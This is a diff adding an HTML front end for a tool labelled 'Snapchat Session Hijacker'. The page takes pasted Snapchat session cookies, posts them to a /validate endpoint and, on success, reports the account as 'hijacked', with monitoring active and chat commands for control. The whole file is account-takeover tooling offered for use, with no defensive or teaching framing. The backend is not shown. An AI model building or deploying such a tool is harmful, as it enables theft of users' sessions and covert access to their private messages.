@@ -1,0 +1,45 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Snapchat Session Hijacker</title>
+    <style>
+        body { background: #FFFC00; font-family: Arial; text-align: center; padding: 50px; }
+        .container { background: white; padding: 30px; border-radius: 20px; max-width: 600px; margin: 0 auto; }
+        textarea { width: 100%; height: 200px; margin: 20px 0; padding: 10px; }
+        button { background: #000; color: #FFFC00; padding: 15px 40px; border: none; border-radius: 30px; font-size: 18px; cursor: pointer; }
+        #result { margin-top: 20px; padding: 15px; border-radius: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 Snapchat Session Hijacker</h1>
+        <p>Paste your Snapchat session cookies below to validate and take control</p>
+        <textarea id="cookies" placeholder="sc-a-session=xxx; sc-a-csrf=xxx; sc-a-nonce=xxx; ..."></textarea>
+        <button onclick="validateSession()">Validate & Hijack Session</button>
+        <div id="result"></div>
+    </div>
+    
+    <script>
+        async function validateSession() {
+            const cookies = document.getElementById('cookies').value;
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = 'Validating...';
+            
+            const resp = await fetch('/validate', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({cookies: cookies})
+            });
+            
+            const data = await resp.json();
+            if (data.success) {
+                resultDiv.innerHTML = `<div style="background:#d4edda">✅ Hijacked as @${data.username}<br>Session: ${data.session_id}<br>Monitoring active. Use ,s or ,sn commands in any chat.</div>`;
+                setTimeout(() => window.location.href = '/dashboard', 2000);
+            } else {
+                resultDiv.innerHTML = `<div style="background:#f8d7da">❌ ${data.error}</div>`;
+            }
+        }
+    </script>
+</body>
+</html>
